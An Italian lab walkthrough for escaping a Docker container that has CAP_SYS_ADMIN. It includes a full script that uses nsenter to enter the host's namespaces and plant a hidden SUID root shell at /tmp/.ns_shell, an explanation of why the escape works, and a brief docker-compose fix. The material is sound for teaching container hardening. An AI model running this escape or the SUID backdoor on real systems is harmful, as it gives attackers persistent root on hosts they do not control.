# 🔓 Docker Escape - Container 2: Guida Pratica (Metodo Funzionante)

## 📋 Riepilogo Scenario

* **Container:** `docker_escape2` (172.20.0.3)
* **Vulnerabilità:** Capabilities eccessive (`CAP_SYS_ADMIN`)
* **Metodo Usato:** Injection nei Namespace Host tramite `nsenter`
* **Stato:** ✅ **VERIFICATO E FUNZIONANTE**

---

## 🔍 Perché il metodo classico ha fallito?

Durante i primi test, il metodo standard (cgroup `release_agent`) ha restituito errore (`Permission denied`). Questo accade perché i sistemi Linux moderni utilizzano **cgroup v2**, che blocca questo specifico vettore di attacco.

Tuttavia, la capability **`CAP_SYS_ADMIN`** è ancora presente. Questa capability è la "chiave maestra" che ci permette di usare tool come `nsenter` per saltare fuori dai confini del container.

---

## 🚀 L'Exploit: Passo dopo Passo

Segui questi passaggi esatti per replicare l'escape che abbiamo appena eseguito con successo.

### Step 1: Accesso al Container

Dal tuo terminale host:
```bash
ssh student@172.20.0.3
# Password: password

step 2: Diventa Root nel Container
L'exploit richiede permessi di root dentro il container per manipolare i processi.

sudo -i

Step 3: Creazione dello Script di Attacco
Poiché l'editor nano potrebbe non esserci, usiamo vi o creiamo il file direttamente con cat.

Crea lo script escape_ns.sh con questo comando (copia e incolla tutto il blocco):

Bash

cat > escape_ns.sh << 'EOF'
#!/bin/sh
echo "[*] Avvio procedura di Escape via nsenter..."

# Verifica se nsenter è disponibile, altrimenti prova a installarlo
if ! command -v nsenter > /dev/null 2>&1; then
    echo "[!] nsenter non trovato. Installazione util-linux in corso..."
    apk add --no-cache util-linux > /dev/null 2>&1
fi

echo "[*] Tentativo di accesso al Namespace del PID 1 (Host)..."

# L'ATTACCO REALE:
# 1. --target 1: Punta al processo init dell'host (o del namespace condiviso)
# 2. --mount --uts --ipc --net --pid: Entra in tutti i namespace
# 3. Copia /bin/sh dell'HOST in /tmp/.ns_shell dell'HOST
# 4. Imposta il bit SUID (chmod 4755) per mantenere i permessi root
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh -c "cp /bin/sh /tmp/.ns_shell && chmod 4755 /tmp/.ns_shell"

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] SUCCESS! Shell creata sull'HOST in /tmp/.ns_shell"
    echo "[+] Ora esci dal container ed eseguila sull'host."
else
    echo "[-] Errore durante l'esecuzione di nsenter."
fi
EOF

Step 4: Esecuzione dell'Exploit
Rendi lo script eseguibile e lancialo:

Bash

chmod +x escape_ns.sh
./escape_ns.sh

>>Output atteso:

[+] SUCCESS! Shell creata sull'HOST in /tmp/.ns_shell


Step 5: Verifica e Accesso Root (Sull'Host)
Disconnettiti dal container:

exit  # Esce da root
exit  # Esce da ssh student, torni al tuo terminale


Sul tuo terminale (Host), verifica che il file sia stato creato:

ls -la /tmp/.ns_shell

Ottieni la Root Shell: Esegui la shell backdoor:
(L'opzione -p è fondamentale: dice alla shell di non resettare i privilegi e mantenere quelli di root).

/tmp/.ns_shell -p


Ultimo passo controlla:

whoami  


Perché ha funzionato?
Ho sfruttato una catena di configurazioni errate:

CAP_SYS_ADMIN: Il container aveva questa capability. È quasi equivalente a essere root perché permette di eseguire comandi privilegiati come mount e nsenter.

Mancanza di User Remapping: L'utente root del container (ID 0) corrispondeva all'utente root dell'host.

Namespace Injection (nsenter):

Il comando nsenter --target 1 ha detto al kernel: "Sposta il mio processo nel contesto del processo numero 1".

Grazie a CAP_SYS_ADMIN, il kernel ha permesso lo spostamento.

Una volta "dentro" il contesto dell'host, il comando cp ha agito sul filesystem dell'host reale, non su quello del container.

Il comando chmod 4755 ha reso il file eseguibile da chiunque ma con i poteri del proprietario (root).

How to fix
Per prevenire questo attacco, modifica il docker-compose.yml:

Rimuovi SYS_ADMIN:

YAML

cap_drop:
  - ALL
# NON aggiungere SYS_ADMIN nella lista cap_add
Usa AppArmor/Seccomp: Impedisci le chiamate di sistema come unshare o setns (usate da nsenter).